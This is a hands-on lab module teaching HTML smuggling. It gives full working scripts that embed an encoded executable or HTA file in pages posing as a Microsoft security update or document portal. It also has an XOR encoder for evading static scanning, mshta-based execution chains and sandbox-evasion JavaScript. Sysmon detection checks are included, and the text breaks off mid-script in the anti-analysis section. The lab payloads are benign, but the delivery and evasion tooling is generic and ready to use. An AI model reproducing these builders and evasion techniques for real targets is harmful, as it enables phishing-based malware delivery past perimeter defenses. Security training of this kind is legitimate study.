# Module 03: Browser Delivery and HTML Smuggling

This is where you stop reading and start attacking. Every exercise in this module gives you hands-on access to your Windows target from your Kali attacker box using the delivery technique that survived every defense improvement since 2022.

HTML smuggling is not a vulnerability. It is not a bug. It is a fundamental abuse of how web browsers work. Microsoft cannot patch it without breaking the internet. That is why it is still alive in 2026.

**What you will build in this module:**
- A basic HTML smuggling page that drops a file onto the victim's machine
- An encrypted smuggling page that hides the payload from static analysis
- An HTA-based execution chain that pops `calc.exe` on the target
- A full attack simulation with Sysmon detection analysis after every step

**Time required:** 3-4 hours (hands-on labs throughout)

**Safety note:** Every payload in this module is harmless. We launch `calc.exe`, run `whoami`, or write text files. No actual malware is created.

---

## Table of Contents

- [Part 1: How HTML Smuggling Works](#part-1-how-html-smuggling-works)
- [Part 2: Your First Smuggling Page](#part-2-your-first-smuggling-page)
- [Part 3: Smuggling a Windows Executable](#part-3-smuggling-a-windows-executable)
- [Part 4: Adding Encryption -- XOR Encoding Layer](#part-4-adding-encryption----xor-encoding-layer)
- [Part 5: The HTA Execution Chain](#part-5-the-hta-execution-chain)
- [Part 6: Anti-Analysis Techniques](#part-6-anti-analysis-techniques)
- [Part 7: Full Attack Chain -- Putting It All Together](#part-7-full-attack-chain----putting-it-all-together)
- [Part 8: Detection Deep Dive -- What Defenders See](#part-8-detection-deep-dive----what-defenders-see)

---

## Part 1: How HTML Smuggling Works

### 1.1 The Problem Attackers Face

After Module 02, you know that modern defenses inspect everything in transit:

```
Attacker sends malware.exe via email
    --> Email gateway scans attachment
    --> Finds executable
    --> BLOCKED

Attacker hosts malware.exe on a web server
    --> Victim clicks link
    --> Web proxy scans the download
    --> Finds executable
    --> BLOCKED (or flagged)
```

Every defense between the attacker and the victim is looking at files as they travel across the network. If the file looks dangerous, it gets blocked before it ever reaches the endpoint.

**HTML smuggling flips this model on its head:** the malicious file never crosses the network. Instead, the attacker sends a harmless-looking HTML page. The HTML page contains JavaScript code that **assembles the malicious file directly inside the victim's browser**. The file is born on the endpoint -- it was never "downloaded" in the traditional sense.

### 1.2 The Blob API -- The Engine Behind Smuggling

HTML smuggling relies on three legitimate browser APIs that every web developer uses:

**API 1: `atob()` -- Base64 Decoding**

```javascript
// Convert a Base64 string back to raw binary data
var decoded = atob("SGVsbG8gV29ybGQ=");
// decoded = "Hello World"
```

Attackers use this to embed binary file data (executables, scripts) as Base64 text inside the HTML page. The JavaScript decodes it back to binary at runtime.

**API 2: `Blob` -- Binary Large Object**

```javascript
// Create a binary file object in memory
var blob = new Blob([binaryData], {type: 'application/octet-stream'});
```

A Blob is a file that exists only in the browser's memory. It has not been written to disk yet. No antivirus can scan it because it is not a file on the filesystem -- it is just bytes in RAM.

**API 3: `URL.createObjectURL()` -- Create a Download Link**

```javascript
// Create a temporary URL that points to the in-memory Blob
var url = URL.createObjectURL(blob);
```

This creates a special `blob:` URL (like `blob:http://example.com/abc123`) that the browser can use to "download" the in-memory Blob to disk, as if it were a normal file download.

### 1.3 The Complete Flow

```
Step 1: Attacker creates an HTML page with embedded Base64 data
Step 2: Victim opens the HTML page (via link, email attachment, etc.)
Step 3: JavaScript in the page runs automatically:
        a. Decodes the Base64 data back to binary bytes
        b. Creates a Blob object from the binary bytes
        c. Creates a blob: URL pointing to the Blob
        d. Creates an invisible <a> element with the download attribute
        e. Programmatically "clicks" the link
Step 4: Browser saves the file to the Downloads folder
Step 5: Victim sees a downloaded file and opens it
```

**What the email gateway / web proxy sees:** A clean HTML page with some JavaScript. No executable. No suspicious file. Just a web page.

**What actually happens on the endpoint:** A fully functional executable or script file materializes in the Downloads folder.

### 1.4 Does MOTW Apply to Smuggled Files?

**Yes.** Modern browsers (Edge, Chrome, Firefox) apply MOTW (`ZoneId=3`) to files downloaded via Blob URLs. The browser knows the file originated from a web context and tags it accordingly.

This means:
- SmartScreen WILL check smuggled executables
- Protected View WILL activate for smuggled Office documents
- Macro blocking WILL apply

**So why is smuggling still useful?** Because smuggling defeats **perimeter defenses** (email gateways, web proxies, sandboxes), not endpoint defenses. The value is getting the payload onto the machine in the first place. Once it is there, you use other techniques (LOLBINs, HTA execution, social engineering) to bypass the endpoint checks.

### 1.5 Why It Cannot Be Patched

The Blob API is essential for modern web applications:
- Google Docs uses it to export documents
- Gmail uses it for attachment downloads
- Every web-based file editor uses it to save files locally
- Video streaming platforms use it for offline downloads

Microsoft and browser vendors **cannot** disable or restrict the Blob API without breaking thousands of legitimate web applications. This is the core reason HTML smuggling has survived since 2022 and will continue to work.

---

## Part 2: Your First Smuggling Page

Let us build the simplest possible HTML smuggling page to understand the mechanics.

### 2.1 Exercise: Smuggle a Text File

**Goal:** Create an HTML page that, when opened, automatically drops a text file onto the Windows VM.

**On your Kali VM**, open a terminal and create the HTML file:

```bash
cat > ~/labs/html/smuggle-text.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>Document Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Loading Document...</h2>
        <div class="spinner"></div>
        <p>Please wait while your document is being prepared.</p>
    </div>

    <script>
        // Step 1: This is our "payload" -- just a text string for now
        // In Base64, "You have been smuggled!\nThis file was assembled
        // inside your browser by JavaScript.\nNo file crossed the network."
        // translates to:
        var base64Data = "WW91IGhhdmUgYmVlbiBzbXVnZ2xlZCEKVGhpcyBmaWxlIHdhcyBhc3NlbWJsZWQgaW5zaWRlIHlvdXIgYnJvd3NlciBieSBKYXZhU2NyaXB0LgpObyBmaWxlIGNyb3NzZWQgdGhlIG5ldHdvcmsu";

        // Step 2: Decode Base64 to raw binary string
        var rawData = atob(base64Data);

        // Step 3: Convert the string to a byte array
        var byteArray = new Uint8Array(rawData.length);
        for (var i = 0; i < rawData.length; i++) {
            byteArray[i] = rawData.charCodeAt(i);
        }

        // Step 4: Create a Blob (in-memory file)
        var blob = new Blob([byteArray], {type: 'application/octet-stream'});

        // Step 5: Create a temporary URL pointing to the Blob
        var url = URL.createObjectURL(blob);

        // Step 6: Create an invisible download link and click it
        var link = document.createElement('a');
        link.href = url;
        link.download = 'document-report.txt';  // filename the victim sees
        document.body.appendChild(link);

        // Step 7: Small delay so the page renders first, then trigger download
        setTimeout(function() {
            link.click();

            // Clean up
            URL.revokeObjectURL(url);
            document.body.removeChild(link);

            // Update the page to look like loading completed
            document.querySelector('.container').innerHTML =
                '<h2>Document Ready</h2>' +
                '<p style="color: green;">&#10004; Your document has been downloaded.</p>' +
                '<p>Check your Downloads folder.</p>';
        }, 2000);  // 2 second delay for realism
    </script>
</body>
</html>
HTMLEOF
```

### 2.2 Serve and Test It

Start the HTTP server on Kali:

```bash
cd ~/labs/html
python3 -m http.server 8080
```

On the **Windows VM**, open Edge (or Firefox) and navigate to:

```
http://192.168.85.129:8080/smuggle-text.html
```

**What you should see:**
1. A clean "Loading Document..." page with a spinning animation
2. After 2 seconds, a file called `document-report.txt` appears in your Downloads
3. The page updates to say "Document Ready"

**Open the downloaded file.** It should contain:

```
You have been smuggled!
This file was assembled inside your browser by JavaScript.
No file crossed the network.
```

### 2.3 Inspect the MOTW

Open PowerShell on the Windows VM:

```powershell
Get-Content -Path "$env:USERPROFILE\Downloads\document-report.txt" -Stream Zone.Identifier
```

You should see:

```
[ZoneTransfer]
ZoneId=3
HostUrl=blob:http://192.168.85.129:8080/...
```

Notice the `HostUrl` says `blob:` -- this tells you the file was created via the Blob API, not downloaded traditionally. This is a forensic indicator of HTML smuggling.

### 2.4 What Just Happened (Step by Step)

```
1. Your browser fetched a normal HTML page (no malware in transit)
2. JavaScript decoded a Base64 string into raw bytes (in browser memory)
3. JavaScript created a Blob object (in-memory file)
4. JavaScript created a blob: URL and an <a> tag with download attribute
5. JavaScript programmatically clicked the link
6. Browser saved the Blob to disk as "document-report.txt"
7. Browser applied MOTW (ZoneId=3) to the saved file
```

An email gateway scanning this HTML page would see: HTML + CSS + JavaScript. No executable. No suspicious file type. Clean.

**Congratulations. You just performed your first HTML smuggling attack.**

---

## Part 3: Smuggling a Windows Executable

Now let us smuggle something more interesting -- a real Windows executable.

### 3.1 Create a Harmless Windows Executable on Kali

We will create a simple program that opens `calc.exe` (the classic "proof of concept" in security research):

```bash
cat > ~/labs/payloads/poc.c << 'EOF'
#include <stdlib.h>
#include <stdio.h>
int main() {
    printf("[*] HTML Smuggling POC - Payload Executed!\n");
    printf("[*] Opening calculator as proof of execution...\n");
    system("calc.exe");
    printf("[*] Done. Check your Sysmon logs!\n");
    return 0;
}
EOF
```

Compile it as a Windows executable:

```bash
x86_64-w64-mingw32-gcc ~/labs/payloads/poc.c -o ~/labs/payloads/poc.exe
```

> If `x86_64-w64-mingw32-gcc` is not installed, run: `sudo apt install -y gcc-mingw-w64-x86-64`

### 3.2 Base64-Encode the Executable

```bash
base64 -w0 ~/labs/payloads/poc.exe > ~/labs/payloads/poc_b64.txt
```

Check the size:

```bash
wc -c ~/labs/payloads/poc_b64.txt
```

This will be around 300-400 KB of Base64 text. That is the data we will embed in our HTML page.

### 3.3 Build the Smuggling Page

We need a script that reads the Base64 file and generates the HTML page:

```bash
cat > ~/labs/scripts/build_smuggler.sh << 'SCRIPTEOF'
#!/bin/bash
# HTML Smuggling Page Builder
# Usage: ./build_smuggler.sh <base64_file> <output_filename> <download_name>

B64_FILE="$1"
OUTPUT="$2"
DOWNLOAD_NAME="$3"

if [ -z "$B64_FILE" ] || [ -z "$OUTPUT" ] || [ -z "$DOWNLOAD_NAME" ]; then
    echo "Usage: $0 <base64_file> <output.html> <download_filename>"
    echo "Example: $0 poc_b64.txt smuggle-exe.html SecurityUpdate.exe"
    exit 1
fi

B64_DATA=$(cat "$B64_FILE")

cat > "$OUTPUT" << HTMLEOF
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Security Update</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            margin: 0;
            padding: 0;
            background: #f5f5f5;
            color: #333;
        }
        .header {
            background: #0078d4;
            color: white;
            padding: 15px 30px;
            font-size: 18px;
        }
        .content {
            max-width: 600px;
            margin: 40px auto;
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #e0e0e0;
            border-radius: 10px;
            overflow: hidden;
            margin: 20px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #0078d4, #00bcf2);
            border-radius: 10px;
            animation: fill 2s ease-in-out forwards;
        }
        @keyframes fill {
            from { width: 0%; }
            to { width: 100%; }
        }
        .status { color: #666; font-size: 14px; }
        .done { color: #107c10; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">Microsoft Security Center</div>
    <div class="content">
        <h2>Security Update Required</h2>
        <p>A critical security update is being prepared for your system.</p>
        <div class="progress-bar"><div class="progress-fill"></div></div>
        <p class="status" id="status">Preparing update package...</p>
    </div>

    <script>
        var base64Data = "${B64_DATA}";

        setTimeout(function() {
            document.getElementById('status').innerText = 'Downloading update...';

            // Decode
            var rawData = atob(base64Data);
            var byteArray = new Uint8Array(rawData.length);
            for (var i = 0; i < rawData.length; i++) {
                byteArray[i] = rawData.charCodeAt(i);
            }

            // Create Blob and trigger download
            var blob = new Blob([byteArray], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = '${DOWNLOAD_NAME}';
            document.body.appendChild(a);
            a.click();
            URL.revokeObjectURL(url);
            document.body.removeChild(a);

            document.getElementById('status').innerHTML =
                '<span class="done">&#10004; Update downloaded successfully.</span><br>' +
                '<small>Open the downloaded file to apply the update.</small>';
        }, 2500);
    </script>
</body>
</html>
HTMLEOF

echo "[+] Smuggling page created: $OUTPUT"
echo "[+] Payload will download as: $DOWNLOAD_NAME"
echo "[+] File size: $(wc -c < "$OUTPUT") bytes"
SCRIPTEOF

chmod +x ~/labs/scripts/build_smuggler.sh
```

Now build the smuggling page:

```bash
cd ~/labs
./scripts/build_smuggler.sh payloads/poc_b64.txt html/smuggle-exe.html SecurityUpdate.exe
```

### 3.4 Serve and Test

```bash
cd ~/labs/html
python3 -m http.server 8080
```

On the **Windows VM**, open Firefox and navigate to:

```
http://192.168.85.129:8080/smuggle-exe.html
```

**What you should see:**
1. A professional-looking "Microsoft Security Update" page
2. A progress bar that fills up
3. After 2.5 seconds, `SecurityUpdate.exe` drops into your Downloads folder
4. The page says "Update downloaded successfully"

### 3.5 Run the Smuggled Executable

Since we compiled this ourselves (unsigned, unknown reputation), SmartScreen will likely trigger.

Open PowerShell on the Windows VM and run it from the command line to see the output:

```powershell
cd ~\Downloads
.\SecurityUpdate.exe
```

> **Note:** If SmartScreen or Defender blocks it, remember the C:\Tools\Labs exclusion we set up in Module 00. Copy the file there first:
> ```powershell
> copy ~\Downloads\SecurityUpdate.exe C:\Tools\Labs\
> cd C:\Tools\Labs
> .\SecurityUpdate.exe
> ```

**Expected output:**

```
[*] HTML Smuggling POC - Payload Executed!
[*] Opening calculator as proof of execution...
[*] Done. Check your Sysmon logs!
```

And the Windows Calculator should open.

### 3.6 Check Sysmon Telemetry

In Administrator PowerShell:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50 |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "SecurityUpdate|calc" } |
    Format-List TimeCreated, Message
```

You should see two process creation events:
1. `SecurityUpdate.exe` itself running
2. `calc.exe` spawned by `SecurityUpdate.exe`

**Key detection indicator:** The parent process chain. Defenders look for unusual parent-child relationships. `explorer.exe` spawning a random unsigned executable from `Downloads` that then launches `calc.exe` -- this screams suspicious to any SOC analyst.

---

## Part 4: Adding Encryption -- XOR Encoding Layer

The smuggling page from Part 3 has a weakness: the Base64-encoded payload is sitting in plain text inside the HTML source. Any security product that opens the HTML file and decodes the Base64 will find the executable.

Let us add an encryption layer so the payload is hidden from static analysis.

### 4.1 How XOR Encryption Works

XOR (exclusive OR) is the simplest encryption possible:

```
Original byte:    01001101  (M)
XOR key byte:     01011010  (Z)
                  --------
Encrypted byte:   00010111  (garbage)

Encrypted byte:   00010111  (garbage)
XOR key byte:     01011010  (Z)  -- same key!
                  --------
Decrypted byte:   01001101  (M)  -- back to original!
```

The beauty of XOR: applying the same key twice gives you back the original data. Encryption and decryption are the same operation.

### 4.2 Create the XOR Encoder (Python -- runs on Kali)

```bash
cat > ~/labs/scripts/xor_encode.py << 'PYEOF'
#!/usr/bin/env python3
"""
XOR encoder for HTML smuggling payloads.
Reads a binary file, XOR-encrypts it with a key, and outputs Base64.
"""
import sys
import base64

def xor_encrypt(data, key):
    """XOR each byte of data with the corresponding byte of the key (repeating)."""
    key_bytes = key.encode('utf-8')
    encrypted = bytearray()
    for i, byte in enumerate(data):
        encrypted.append(byte ^ key_bytes[i % len(key_bytes)])
    return bytes(encrypted)

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <input_file> <output_b64_file> <xor_key>")
    print(f"Example: {sys.argv[0]} poc.exe poc_xor_b64.txt MySecretKey123")
    sys.exit(1)

input_file = sys.argv[1]
output_file = sys.argv[2]
xor_key = sys.argv[3]

# Read the binary file
with open(input_file, 'rb') as f:
    raw_data = f.read()

print(f"[+] Read {len(raw_data)} bytes from {input_file}")
print(f"[+] XOR key: {xor_key}")

# XOR encrypt
encrypted = xor_encrypt(raw_data, xor_key)

# Base64 encode
b64_data = base64.b64encode(encrypted).decode('utf-8')

# Write output
with open(output_file, 'w') as f:
    f.write(b64_data)

print(f"[+] Encrypted and encoded: {len(b64_data)} bytes written to {output_file}")
PYEOF

chmod +x ~/labs/scripts/xor_encode.py
```

### 4.3 Encrypt the Payload

```bash
python3 ~/labs/scripts/xor_encode.py ~/labs/payloads/poc.exe ~/labs/payloads/poc_xor_b64.txt "SmuggleKey2026"
```

Now the Base64 data in `poc_xor_b64.txt` is encrypted. If anyone decodes the Base64, they get garbage -- not the original executable.

### 4.4 Build the Encrypted Smuggling Page

```bash
cat > ~/labs/scripts/build_xor_smuggler.sh << 'SCRIPTEOF'
#!/bin/bash
# Encrypted HTML Smuggling Page Builder (XOR + Base64)

B64_FILE="$1"
OUTPUT="$2"
DOWNLOAD_NAME="$3"
XOR_KEY="$4"

if [ -z "$B64_FILE" ] || [ -z "$OUTPUT" ] || [ -z "$DOWNLOAD_NAME" ] || [ -z "$XOR_KEY" ]; then
    echo "Usage: $0 <xor_b64_file> <output.html> <download_filename> <xor_key>"
    exit 1
fi

B64_DATA=$(cat "$B64_FILE")

cat > "$OUTPUT" << HTMLEOF
<!DOCTYPE html>
<html>
<head>
    <title>Document Portal</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #1a1a2e;
            color: #eee;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: #16213e;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
            max-width: 500px;
        }
        .loader {
            width: 50px; height: 50px;
            border: 5px solid #333;
            border-top: 5px solid #e94560;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .btn {
            display: none;
            background: #e94560;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 15px;
        }
        .btn:hover { background: #c73550; }
    </style>
</head>
<body>
    <div class="card">
        <h2 id="title">Decrypting Document...</h2>
        <div class="loader" id="loader"></div>
        <p id="msg">Processing secure document. Please wait.</p>
        <button class="btn" id="dlBtn" onclick="doDownload()">Download Document</button>
    </div>

    <script>
        // XOR-encrypted, Base64-encoded payload
        var encData = "${B64_DATA}";
        var xorKey = "${XOR_KEY}";
        var fileName = "${DOWNLOAD_NAME}";
        var blobUrl = null;

        function xorDecrypt(data, key) {
            var result = new Uint8Array(data.length);
            for (var i = 0; i < data.length; i++) {
                result[i] = data[i] ^ key.charCodeAt(i % key.length);
            }
            return result;
        }

        // Decrypt after a delay (simulates "processing")
        setTimeout(function() {
            // Step 1: Base64 decode
            var raw = atob(encData);
            var encrypted = new Uint8Array(raw.length);
            for (var i = 0; i < raw.length; i++) {
                encrypted[i] = raw.charCodeAt(i);
            }

            // Step 2: XOR decrypt
            var decrypted = xorDecrypt(encrypted, xorKey);

            // Step 3: Create Blob
            var blob = new Blob([decrypted], {type: 'application/octet-stream'});
            blobUrl = URL.createObjectURL(blob);

            // Update UI
            document.getElementById('loader').style.display = 'none';
            document.getElementById('title').innerText = 'Document Ready';
            document.getElementById('msg').innerText = 'Your document has been decrypted.';
            document.getElementById('dlBtn').style.display = 'inline-block';
        }, 3000);

        function doDownload() {
            var a = document.createElement('a');
            a.href = blobUrl;
            a.download = fileName;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            document.getElementById('msg').innerText = 'Downloaded. Check your Downloads folder.';
            document.getElementById('dlBtn').style.display = 'none';
        }
    </script>
</body>
</html>
HTMLEOF

echo "[+] XOR-encrypted smuggling page created: $OUTPUT"
echo "[+] XOR key embedded: $XOR_KEY"
echo "[+] Download filename: $DOWNLOAD_NAME"
SCRIPTEOF

chmod +x ~/labs/scripts/build_xor_smuggler.sh
```

Build the encrypted page:

```bash
cd ~/labs
./scripts/build_xor_smuggler.sh payloads/poc_xor_b64.txt html/smuggle-xor.html SecurityPatch.exe "SmuggleKey2026"
```

### 4.5 Test the Encrypted Smuggling Page

```bash
cd ~/labs/html
python3 -m http.server 8080
```

On the **Windows VM**, open Firefox:

```
http://192.168.85.129:8080/smuggle-xor.html
```

**What you should see:**
1. A dark-themed "Decrypting Document..." page with a spinning loader
2. After 3 seconds, a **"Download Document"** button appears
3. Click the button -- `SecurityPatch.exe` drops into Downloads
4. Copy it to `C:\Tools\Labs` and run it -- Calculator opens

### 4.6 Why This Matters

If a security tool inspects the HTML source and finds the Base64 data, it will decode it and find... encrypted garbage. Not an executable. The XOR key is embedded in the JavaScript, but an automated scanner would need to actually execute the JavaScript to reconstruct the file. Most static analysis tools do not do this.

**Defense layers bypassed by encrypted smuggling:**
- Email gateway: sees HTML + JavaScript (clean)
- Web proxy: sees HTML download (clean)
- Static file analysis: Base64 decodes to encrypted noise (clean)
- Sandbox: may or may not execute JavaScript fully

**Defense layers NOT bypassed:**
- MOTW: still applied by the browser
- SmartScreen: still checks the downloaded file
- Defender: still scans the file on disk
- Sysmon: still logs everything

---

## Part 5: The HTA Execution Chain

So far, we have been smuggling `.exe` files. The problem: `.exe` files trigger immediate suspicion from SmartScreen, Defender, and the user. Let us use a different file type that executes code but looks less threatening.

### 5.1 What Is an HTA File?

An HTA (HTML Application) is a file with the `.hta` extension that contains HTML and VBScript or JScript. When you double-click an `.hta` file, Windows runs it using `mshta.exe` -- a signed Microsoft binary.

**Why HTA is useful for attackers:**
1. `mshta.exe` is a trusted, signed Microsoft binary (it IS the operating system)
2. HTA files can execute VBScript/JScript with full system access
3. HTA files can run commands, create files, download content
4. The icon for `.hta` files can be confused with `.html` files by non-technical users

### 5.2 Create an HTA Payload

On Kali, create an HTA file that opens Calculator (our safe proof-of-concept):

```bash
cat > ~/labs/payloads/update.hta << 'HTAEOF'
<html>
<head>
    <title>System Update</title>
    <HTA:APPLICATION
        ID="SystemUpdate"
        APPLICATIONNAME="System Update"
        BORDER="thin"
        BORDERSTYLE="normal"
        CAPTION="yes"
        MAXIMIZEBUTTON="no"
        MINIMIZEBUTTON="no"
        SHOWINTASKBAR="no"
        SINGLEINSTANCE="yes"
        SYSMENU="no"
        WINDOWSTATE="minimize"
    />
</head>
<body>
<script language="VBScript">
    ' Minimize the window immediately so the user barely sees it
    self.resizeTo 0, 0
    self.moveTo -1000, -1000

    ' Create a shell object
    Set objShell = CreateObject("WScript.Shell")

    ' === PAYLOAD SECTION ===
    ' In a real engagement, this would be a reverse shell or C2 stager
    ' For our lab, we open calc.exe as proof of concept
    objShell.Run "calc.exe", 1, False

    ' Close the HTA window after execution
    self.close
</script>
</body>
</html>
HTAEOF
```

### 5.3 Test the HTA Locally First

Before smuggling it, let us verify it works by serving it directly.

On Kali:

```bash
cd ~/labs/payloads
python3 -m http.server 8080
```

On the **Windows VM**, open Firefox and download:

```
http://192.168.85.129:8080/update.hta
```

Now navigate to your Downloads folder and double-click `update.hta`.

**What should happen:**
1. A brief flash of a window (the HTA minimizes itself immediately)
2. Calculator opens
3. The HTA window closes itself

**This is the execution chain:** You double-clicked an HTA file, Windows invoked `mshta.exe`, which ran the VBScript inside, which called `calc.exe`.

### 5.4 Smuggle the HTA

Now let us deliver this HTA via HTML smuggling so it bypasses perimeter defenses.

On Kali:

```bash
# Base64-encode the HTA
base64 -w0 ~/labs/payloads/update.hta > ~/labs/payloads/hta_b64.txt

# Build the smuggling page
cd ~/labs
./scripts/build_smuggler.sh payloads/hta_b64.txt html/smuggle-hta.html Update.hta
```

Serve it:

```bash
cd ~/labs/html
python3 -m http.server 8080
```

On the **Windows VM**, open Firefox:

```
http://192.168.85.129:8080/smuggle-hta.html
```

**What happens:**
1. The "Microsoft Security Update" themed page loads
2. After 2.5 seconds, `Update.hta` drops into Downloads
3. Navigate to Downloads and double-click `Update.hta`
4. Calculator pops open

**You just performed a complete HTML smuggling to HTA execution chain.** The HTA file was never sent as a file over the network. It was assembled inside the browser from JavaScript.

### 5.5 Check the Full Sysmon Trail

This is where it gets really educational. Let us see what the entire attack chain looks like in Sysmon.

In Administrator PowerShell on the Windows VM:

```powershell
# Find the mshta.exe process creation
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "mshta" } |
    Select-Object -First 1 |
    Format-List TimeCreated, Message
```

You should see:
- **Image:** `C:\Windows\System32\mshta.exe`
- **CommandLine:** `"C:\Windows\System32\mshta.exe" "C:\Users\...\Downloads\Update.hta"`
- **ParentImage:** `C:\Windows\explorer.exe` (because you double-clicked it)

Now find the child process (calc.exe spawned by mshta.exe):

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -eq 1 -and $_.Message -match "calc" } |
    Select-Object -First 1 |
    Format-List TimeCreated, Message
```

You should see:
- **Image:** `C:\Windows\System32\calc.exe`
- **ParentImage:** `C:\Windows\System32\mshta.exe`

**This is the detection chain:** `explorer.exe` → `mshta.exe` → `calc.exe`. A SOC analyst seeing `mshta.exe` spawn ANY child process would immediately flag this as suspicious.

### 5.6 The HTA + PowerShell Variant

Instead of launching `calc.exe`, a real attacker would use the HTA to run a PowerShell command. Let us create a version that runs `whoami` and writes the output to a file (still harmless, but demonstrates the concept):

```bash
cat > ~/labs/payloads/recon.hta << 'HTAEOF'
<html>
<head>
    <HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no" SYSMENU="no" />
</head>
<body>
<script language="VBScript">
    self.resizeTo 0, 0
    self.moveTo -1000, -1000

    Set objShell = CreateObject("WScript.Shell")

    ' Run whoami and write output to a file
    objShell.Run "cmd.exe /c whoami > C:\Tools\Labs\whoami_output.txt", 0, True

    ' Also grab basic system info
    objShell.Run "cmd.exe /c systeminfo | findstr /B /C:""OS Name"" /C:""OS Version"" >> C:\Tools\Labs\whoami_output.txt", 0, True

    self.close
</script>
</body>
</html>
HTAEOF
```

Smuggle it:

```bash
base64 -w0 ~/labs/payloads/recon.hta > ~/labs/payloads/recon_hta_b64.txt
cd ~/labs
./scripts/build_smuggler.sh payloads/recon_hta_b64.txt html/smuggle-recon.html SystemCheck.hta
```

Test it on Windows the same way. After running the HTA, check:

```powershell
Get-Content C:\Tools\Labs\whoami_output.txt
```

You should see your username and OS information. This demonstrates how an attacker would use HTML smuggling + HTA to perform initial reconnaissance on the target.

Now check the Sysmon trail:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 100 |
    Where-Object { $_.Id -eq 1 -and ($_.Message -match "mshta|cmd.exe|whoami|systeminfo") } |
    Select-Object -First 10 |
    Format-List TimeCreated, Message
```

You will see the complete execution chain: `mshta.exe` → `cmd.exe` → `whoami.exe` / `systeminfo.exe`. Every single step is logged.

---

## Part 6: Anti-Analysis Techniques

Real-world HTML smuggling pages include checks to avoid automated analysis by security sandboxes. Here are the most common techniques and how to implement them.

### 6.1 User Interaction Gate

Instead of auto-downloading, require the user to click a button. Sandboxes rarely simulate button clicks.

We already implemented this in Part 4 (the "Download Document" button in the XOR-encrypted page). The key code is:

```javascript
// Don't auto-download. Wait for a human click.
document.getElementById('dlBtn').onclick = function() {
    // ... build and download the file only when clicked
};
```

**Why it works:** Automated sandboxes open the HTML page and wait for something to happen. If nothing downloads automatically, the sandbox sees a clean page and moves on.

### 6.2 Mouse Movement Detection

Check if a real human is interacting with the page:

```javascript
var mouseDetected = false;

document.addEventListener('mousemove', function() {
    if (!mouseDetected) {
        mouseDetected = true;
        // Only show the download button after mouse movement
        document.getElementById('dlBtn').style.display = 'inline-block';
    }
});
```

**Why it works:** Sandboxes do not typically simulate mouse movement. The download button never appears, so the sandbox sees a benign page.

### 6.3 Screen Size Check

Sandboxes often run in small, fixed-size virtual screens:

```javascript
if (screen.width < 800 || screen.height < 600) {
    // Likely a sandbox -- do nothing
    document.body.innerHTML = '<h1>Page not available</h1>';
} else {
    // Real user -- proceed with smuggling
    deliverPayload();
}
```

### 6.4 Time-Based Delay

Force a longer delay before payload delivery. Sandboxes typically analyze pages for a limited time (30-60 seconds):

```javascript
// Wait 45 seconds before doing anything
setTimeout(function() {
    deliverPayload();
}, 45000);
```

**Trade-off:** Real users might leave the page before 45 seconds. Most real campaigns use 3-5 seconds, balancing evasion with user patience.

### 6.5 Combined Anti-Analysis Smuggling Page

Let us build a page that combines multiple techniques:

```bash
cat > ~/labs/html/smuggle-advanced.html << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <title>Secure File Portal</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .portal {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            padding: 40px;
            border-radius: 15px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.1);
            max-width: 450px;
        }
        .btn {
            background: #6c63ff;
            color: white;
            border: none;
            padding: 14px 35px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            display: none;
            margin-top: 20px;
            transition: background 0.3s;
        }
        .btn:hover { background: #5a52d5; }
        .check { color: #4ade80; margin-right: 8px; }
        #checks { text-align: left; margin: 20px 0; font-size: 14px; }
        #checks div { margin: 8px 0; opacity: 0; transition: opacity 0.5s; }
    </style>
</head>
<body>
    <div class="portal">
        <h2>Secure File Portal</h2>
        <p>Verifying your session...</p>
        <div id="checks">
            <div id="c1">Verifying display resolution...</div>
            <div id="c2">Checking session integrity...</div>
            <div id="c3">Preparing secure download...</div>
        </div>
        <button class="btn" id="dlBtn">Access Document</button>
    </div>

    <script>
        var passed = 0;

